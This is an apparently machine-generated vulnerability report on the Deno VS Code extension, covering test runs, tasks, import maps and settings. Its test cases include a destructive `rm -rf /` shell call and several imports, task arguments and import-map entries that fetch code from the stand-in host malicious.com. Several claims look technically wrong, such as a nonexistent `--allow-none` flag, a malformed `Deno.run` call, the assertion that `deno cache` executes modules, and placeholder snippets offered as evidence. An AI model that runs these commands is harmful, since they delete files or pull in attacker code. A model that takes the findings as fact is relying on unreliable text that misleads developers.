### Combined Vulnerabilities List

#### **Vulnerability Name**: Arbitrary Code Execution via Malicious Deno Tests with Default `--allow-all` Permissions
**Description**: The extension's default configuration for test execution via the Test Code Lens feature includes the `--allow-all` flag. An attacker can craft a malicious Deno test file (e.g., `tests/malicious_test.ts`) containing harmful system commands (e.g., `Deno.run("sh", { stdin: "rm -rf /" })`). When a user triggers the test via the "Run Test" Code Lens, the test executes with full Deno permissions, allowing unauthorized system access.
**Impact**: Full system access, leading to data destruction, theft, or compromise.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. The default `deno.codeLens.testArgs` is `["--allow-all"]`.
**Missing Mitigations**:
  - Default settings should restrict permissions (e.g., `--allow-none`).
  - Require explicit user approval for `--allow-all`.
**Preconditions**:
  - User has the extension installed with default settings.
  - Malicious test file exists in the workspace.
  - User clicks the Test Code Lens.
**Source Code Analysis**:
  In `client/src/commands.ts`, the `test` function directly uses `--allow-all` from the configuration:
  ```typescript
  const testArgs: string[] = config.get("codeLens.testArgs") ?? ["--allow-all"];
  // Malicious args are included directly from settings
  ```
  The test execution process runs these arguments without validation.
**Security Test Case**:
  1. Create `tests/malicious.ts` with `Deno.run("sh", { args: ["echo Compromise > /tmp/exploit"] });`.
  2. Ensure `deno.codeLens.testArgs` is default (`["--allow-all"]`).
  3. Open the file in VSCode and click "Run Test".
  4. Verify `/tmp/exploit` is created.

#### **Vulnerability Name**: Test Execution with Unrestricted User-Supplied Arguments
**Description**: The test execution process in `client/src/commands.ts` directly includes user-supplied settings (e.g., `deno.env`, import maps, or `deno.unstable`) without validation. An attacker could manipulate these to execute malicious code (e.g., injecting shell commands via environment variables).
**Impact**: Arbitrary code execution via injected commands (e.g., environment variables, malicious import maps).
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: None.
**Missing Mitigations**:
  - Sanitize user-supplied arguments (e.g., environment variables, import maps).
  - Restrict dangerous command-line arguments.
**Preconditions**:
  - User has malicious settings configured (e.g., `deno.env` with shell commands).
  - The test execution includes these dangerous settings.
**Source Code Analysis**:
  In `client/src/commands.ts`, unvalidated user-supplied values are used directly:
  ```typescript
  const env = config.get<Record<string, string>>("env"); // Unvalidated
  // Directly used in process execution without sanitization
  ```
**Security Test Case**:
  1. Set `deno.env` to `{"CMD": "echo Compromise > /tmp/compromise"}`.
  2. Create a test file using `Deno.env.get("CMD")`.
  3. Run the test via Test Code Lens.
  4. Verify `/tmp/compromise` is created.

#### **Vulnerability Name**: Improper Validation of Remote Module Imports Leading to Remote Code Execution (RCE)
**Description**: The extension enables automatic caching of remote module imports via the `deno.cacheOnSave` setting, which is enabled by default in versions 3.35.0 and later. When a user opens a malicious Deno project with crafted import URLs (e.g., `https://attacker.com/malicious.js`), saving the file triggers Deno to fetch and execute these remote modules. The extension does not validate or sanitize the imported URLs, allowing attackers to execute arbitrary code.
**Impact**: An attacker can execute arbitrary code on the victim's machine by tricking them into opening a malicious Deno project and saving a file.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None explicitly stated in the provided files. The default `cacheOnSave` is enabled without user confirmation for untrusted imports.
**Missing Mitigations**:
  - Lack of validation for remote module sources (e.g., checking against a whitelist of trusted domains).
  - No prompt or warning for untrusted imports before caching.
  - No option to disable automatic execution of remote modules during caching.
**Preconditions**:
  - The extension is installed.
  - `deno.cacheOnSave` is enabled (default in 3.35.0+).
  - User opens a malicious Deno project with an import URL pointing to an attacker's server.
**Source Code Analysis**:
  - **client/src/constants.ts**:
    ```typescript
    // Default configuration includes cacheOnSave enabled since 3.35.0
    ```
  - **client/src/commands.ts**:
    The `cacheActiveDocument` command directly triggers `deno cache` without validation:
    ```typescript
    async () => {
      const activeEditor = vscode.window.activeTextEditor;
      if (!activeEditor) return;
      const uri = activeEditor.document.uri.toString();
      return vscode.commands.executeCommand("deno.cache", [uri], uri);
    };
    ```
**Security Test Case**:
  1. Create a file `test.ts` with a malicious import:
     ```typescript
     import _ from "https://malicious.com/exploit.js";
     ```
  2. Open `test.ts` in VS Code with the extension installed.
  3. Save the file: The extension automatically runs `deno cache test.ts`, fetching and executing the remote script from `malicious.com`.
  4. The attacker's server logs the request or executes code via the imported module.

#### **Vulnerability Name**: Unrestricted Execution of Test Commands with Untrusted Imports
**Description**: The extension's test execution feature (via `Test Run` commands) processes test files that may include malicious remote imports. When running tests, the extension executes `deno test` without validating imported URLs, allowing attackers to execute arbitrary code through crafted test files.
**Impact**: Successful exploitation allows remote code execution during test runs, compromising the system.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: Users can disable tests via settings, but this doesn't address unsafe imports.
**Missing Mitigations**:
  - No validation of remote imports before executing tests.
  - No isolation or sandboxing for test execution.
**Preconditions**:
  - The extension is installed.
  - A malicious test file is present in the workspace.
**Source Code Analysis**:
  - **client/src/testing.ts**:
    The `DenoTestController` executes tests via `deno test` without input validation:
    ```typescript
    const { enqueued } = await client.sendRequest(testRun, {
      id,
      kind: "run",
      isContinuous,
      include,
      exclude,
    });
    ```
**Security Test Case**:
  1. Create `test.ts` with a malicious import:
     ```typescript
     import { exploit } from "https://malicious.com/exploit.ts";
     Deno.test("dummy", () => exploit());
     ```
  2. Open the file in VS Code and right-click to run the test via the test explorer.
  3. The extension runs `deno test`, fetching and executing the remote module.

#### **Vulnerability Name**: Task Execution of Arbitrary Deno Commands with User-Supplied Paths
**Description**: Custom tasks defined via `tasks.json` can execute arbitrary Deno commands with user-provided arguments, including paths to remote modules. The extension does not validate these paths, allowing attackers to inject malicious imports via crafted task configurations.
**Impact**: The task executes the remote script, leading to RCE.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: Users must manually configure tasks, but attackers could trick users into loading malicious task definitions.
**Missing Mitigations**:
  - No validation of task command arguments for remote imports.
  - No warnings for untrusted task sources.
**Preconditions**:
  - A malicious `tasks.json` is present in the workspace.
**Source Code Analysis**:
  - **client/src/tasks.ts**:
    The `buildDenoTask` method constructs tasks without validating arguments:
    ```typescript
    const args = task.args || [];
    // No checks for remote URLs in args
    ```
**Security Test Case**:
  1. Create a `tasks.json` with a malicious task:
     ```json
     {
       "type": "deno",
       "command": "run",
       "args": ["--allow-run", "https://malicious.com/exploit.ts"],
       "label": "Run Exploit"
     }
     ```
  2. Run the "Run Exploit" task via VS Code's task runner.
  3. The remote script executes, achieving RCE.

---

#### **Vulnerability Name**: Unsanitized Command-Line Arguments in Tasks
**Description**: The extension executes Deno CLI tasks defined in workspace configurations (e.g., `deno.json`) without validating or sanitizing user-provided command-line arguments. Attackers could craft malicious task definitions with arguments like `--allow-run` followed by arbitrary commands, leading to remote code execution.
**Impact**: Attackers can execute arbitrary system commands on the victim's machine.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. The extension directly uses user-provided arguments without validation.
**Missing Mitigations**: Input validation/sanitization for task arguments, especially checking for dangerous flags like `--allow-run`.
**Preconditions**:
  - The workspace contains a malicious `deno.json` or workspace configuration with crafted task definitions.
**Source Code Analysis**:
  - **tasks.ts**: `buildDenoTask` uses `args` from task definitions without validation:
    ```typescript
    const args = [definition.command].concat(definition.args ?? []);
    ```
  - **tasks_sidebar.ts**: Tasks from `deno.json` are executed without checking arguments for dangerous flags.
**Security Test Case**:
  1. Create a workspace with `deno.json` containing a task with `--allow-run` and a malicious command.
  2. Open the workspace in VS Code and run the task via the tasks panel.
  3. Observe the malicious command executing on the system.

---

#### **Vulnerability Name**: Unvalidated Deno CLI Path Configuration
**Description**: The extension allows users to specify the Deno CLI path via the `deno.path` setting without verifying it points to the legitimate Deno binary. An attacker could configure this path to point to a malicious executable, leading to arbitrary code execution.
**Impact**: Execution of arbitrary code via the malicious Deno binary.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. The path is used directly without validation.
**Missing Mitigations**: Path validation to ensure it points to the authentic Deno executable.
**Preconditions**:
  - The attacker has write access to VS Code settings or workspace configuration files.
**Source Code Analysis**:
  - **commands.ts**: `getDenoCommandPath` retrieves the path from user settings without validation:
    ```typescript
    const command = getWorkspaceConfigDenoExePath();
    ```
**Security Test Case**:
  1. Modify VS Code settings to set `deno.path` to a malicious script.
  2. Trigger any Deno CLI operation (e.g., running a test).
  3. Observe the malicious script executing instead of the legitimate Deno CLI.

---

#### **Vulnerability Name**: Insecure Test Configuration with `--allow-run`
**Description**: Test configurations can include arbitrary command-line arguments (e.g., `deno.testing.args` defaults to `["--allow-all"]`). Attackers can modify these arguments to include `--allow-run` and execute malicious code via test runs.
**Impact**: Execution of arbitrary code during test runs.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: Users must explicitly enable `--allow-run` via settings.
**Missing Mitigations**: Validation that test arguments do not include dangerous permissions.
**Preconditions**:
  - The attacker has control over VS Code workspace settings.
**Source Code Analysis**:
  - **commands.ts**: Test command uses `testArgs` from user configuration without checks for dangerous flags:
    ```typescript
    const testArgs: string[] = [ ...(config.get<string[]>("codeLens.testArgs") ?? []) ];
    ```
**Security Test Case**:
  1. Configure `deno.testing.args` to include `--allow-run` and a malicious command.
  2. Run a test via the test explorer or code lens.
  3. Observe the script executing with elevated permissions.

---

#### **Vulnerability Name**: Unvalidated Import Maps Leading to Arbitrary Code Execution
**Description**: The extension allows Deno's language server to use `import_map.json` or `deno.json` configuration files provided by the workspace without validating or sanitizing the URLs specified in these files. Attackers can craft a malicious `import_map.json` file in a workspace to redirect module imports to attacker-controlled URLs. When the extension processes files using the Deno language server, it will fetch and execute modules from these malicious URLs, potentially leading to remote code execution (RCE).
**Impact**: Attackers can execute arbitrary code in the user's environment by hijacking module resolution.
**Vulnerability Rank**: Critical
**Currently Implemented Mitigations**: None. The code directly uses the `importMap` setting from configuration without validation.
**Missing Mitigations**:
  - Validation of URLs in import maps to restrict to trusted domains.
  - User confirmation prompt before loading external import maps.
  - Sandbox execution of third-party modules.
**Preconditions**:
  - A malicious `import_map.json` or `deno.json` file exists in the workspace.
  - The Deno extension is enabled for the workspace.
**Source Code Analysis**:
  In `client/src/commands.ts`, the `transformDenoConfiguration` function directly passes the user-provided `importMap` setting to the language server:
  ```typescript
  config = vscode.workspace.getConfiguration(EXTENSION_NS);
  // ...
  return { ...denoConfiguration };
  ```
  The Deno language server then uses this import map without validating URLs, leading to untrusted module resolution.
**Security Test Case**:
  1. Create a malicious `import_map.json` with a hostile `mappings` entry:
     ```json
     {
       "imports": {
         "harmless-module": "https://malicious.com/exploit.js"
       }
     }
     ```
  2. Place this file in a VSCode workspace.
  3. Enable Deno for the workspace via `deno.enable` or a `deno.json` file.
  4. Open a file importing `harmless-module` (e.g., `import { func } from "harmless-module";`).
  5. Observe that the extension's language server fetches and executes code from `https://malicious.com/exploit.js`, triggering RCE.

#### **Vulnerability Name**: Unauthorized Deno Configuration Loading
**Description**: The extension automatically enables Deno configurations (`deno.json`) in workspaces without explicit user confirmation. Attackers can place a malicious `deno.json` in a workspace to configure dangerous settings (e.g., enabling unstable features or unsafe import mappings), which the extension applies without user approval.
**Impact**: Attackers can gain network access or execute modules from untrusted sources without user consent.
**Vulnerability Rank**: High
**Currently Implemented Mitigations**: The extension checks for `deno.json` but does not require user confirmation.
**Missing Mitigations**:
  - Prompt users to review configurations before applying them.
  - Restrict permissions by default unless explicitly granted.
**Preconditions**:
  - A malicious `deno.json` exists in the workspace.
**Source Code Analysis**:
  In `client/src/enable.ts`, `isPathEnabled` enables Deno based on presence of `deno.json` without user interaction:
  ```typescript
  return scopesWithDenoJson.some((scope) => pathStartsWith(filePath, scope));
  ```
  This auto-enables the configuration without prompting the user.
**Security Test Case**:
  1. Create a `deno.json` with dangerous settings:
     ```json
     {
       "allowNet": ["*"],
       "importMap": "https://malicious.com/import_map.json"
     }
     ```
  2. Open the workspace in VSCode.
  3. Check that Deno configurations are applied automatically, granting unrestricted network access and importing from malicious URLs.
